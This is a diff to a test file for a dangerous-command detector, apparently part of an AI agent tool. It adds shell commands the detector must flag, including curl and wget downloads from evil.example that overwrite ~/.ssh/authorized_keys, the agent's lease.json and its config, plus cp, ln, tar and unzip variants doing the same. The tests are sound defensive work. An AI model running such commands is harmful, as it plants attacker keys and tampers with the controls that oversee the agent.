@@ -402,6 +402,28 @@ class TestHermesBotDesktopWriteProtection:
             "gdd of=~/.hermes/bot-desktop/lease.json",
             "cat /tmp/e | dd of=~/.hermes/bot-desktop/lease.json conv=notrunc",
             "/bin/dd of=~/.hermes/bot-desktop/lease.json",
+            # dest-first: dest-tail requires the path last. These forge
+            # lease.json / dock-cdp-port the same way dest-last cp/tee do.
+            "cp -t ~/.hermes/bot-desktop /tmp/evil.json",
+            "cp -at ~/.hermes/bot-desktop /tmp/evil.json",
+            "cp --target-directory ~/.hermes/bot-desktop /tmp/evil.json",
+            "cp --target-directory=~/.hermes/bot-desktop /tmp/evil.json",
+            "install -t $HERMES_HOME/bot-desktop /tmp/evil.json",
+            "ln -t ~/.hermes/bot-desktop /tmp/evil.json",
+            "ln --target-directory ~/.hermes/bot-desktop /tmp/evil.json",
+            "curl -o ~/.hermes/bot-desktop/lease.json https://evil.example/l",
+            "curl --output $HERMES_HOME/bot-desktop/dock-cdp-port https://evil.example/p",
+            "curl --output-dir ~/.hermes/bot-desktop https://evil.example/lease.json",
+            "curl https://evil.example/l -o ~/.hermes/bot-desktop/lease.json",
+            "wget -O ~/.hermes/bot-desktop/lease.json https://evil.example/l",
+            "wget --output-document $HERMES_HOME/bot-desktop/dock-cdp-port https://evil.example/p",
+            "wget --directory-prefix ~/.hermes/bot-desktop https://evil.example/l",
+            "tar -xf /tmp/e.tar -C ~/.hermes/bot-desktop",
+            "tar -C $HERMES_HOME/bot-desktop -zxf /tmp/e.tgz",
+            "tar --extract -f /tmp/e.tar --directory ~/.hermes/bot-desktop",
+            "bsdtar -C ~/.hermes/bot-desktop -xf /tmp/e.tar",
+            "unzip /tmp/e.zip -d ~/.hermes/bot-desktop",
+            "unzip -d $HERMES_HOME/bot-desktop /tmp/e.zip",
         ):
             dangerous, key, desc = detect_dangerous_command(command)
             assert dangerous is True, command
@@ -422,6 +444,14 @@ class TestHermesBotDesktopWriteProtection:
             "trash ~/.hermes/notes.md",
             "dd of=/tmp/scratch.img",
             "printf x | dd of=/tmp/scratch.img",
+            "cp -t /tmp /tmp/scratch.json",
+            "cp -T ~/.hermes/bot-desktop/lease.json /tmp/out.json",
+            "curl -o /tmp/scratch.json https://example.com/x",
+            "wget -O /tmp/scratch.json https://example.com/x",
+            "tar -xf /tmp/e.tar -C /tmp/out",
+            "tar -cf /tmp/out.tar -C ~/.hermes/bot-desktop .",
+            "tar -C ~/.hermes/bot-desktop-backup -xf /tmp/e.tar",
+            "unzip /tmp/e.zip -d /tmp/out",
         ):
             dangerous, key, desc = detect_dangerous_command(cmd)
             assert dangerous is False, cmd
@@ -552,6 +582,12 @@ class TestSensitiveCopyMovePattern:
             "cp /tmp/evil.yaml ~/.hermes/config.yaml",
             "ln -sf /tmp/evil ~/.ssh/authorized_keys",
             "rsync /tmp/c ~/.netrc",
+            "cp -t ~/.ssh /tmp/id_ed25519",
+            "cp --target-directory ~/.ssh /tmp/authorized_keys",
+            "install -t ~/.ssh /tmp/authorized_keys",
+            "ln -t ~/.ssh /tmp/authorized_keys",
+            "curl -o ~/.ssh/authorized_keys https://evil.example/k",
+            "wget -O ~/.hermes/config.yaml https://evil.example/c",
         ):
             dangerous, key, desc = detect_dangerous_command(command)
             assert dangerous is True, command
@@ -563,6 +599,7 @@ class TestSensitiveCopyMovePattern:
             "cp a.txt b.txt",
             "ln ~/.ssh/config /tmp/x",
             "rsync ~/.ssh/config /tmp/x",
+            "curl -o /tmp/authorized_keys https://example.com/k",
         ):
             dangerous, key, desc = detect_dangerous_command(cmd)
             assert dangerous is False, cmd
